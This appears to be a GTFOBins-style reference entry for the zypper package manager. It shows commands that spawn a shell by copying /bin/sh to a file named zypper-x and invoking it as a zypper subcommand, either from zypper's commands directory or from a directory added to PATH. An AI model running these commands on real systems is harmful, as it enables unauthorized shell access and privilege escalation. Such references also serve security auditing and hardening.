title: zypper
html:
zypper

Shell

The copy usually requires elevated privileges.

cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x
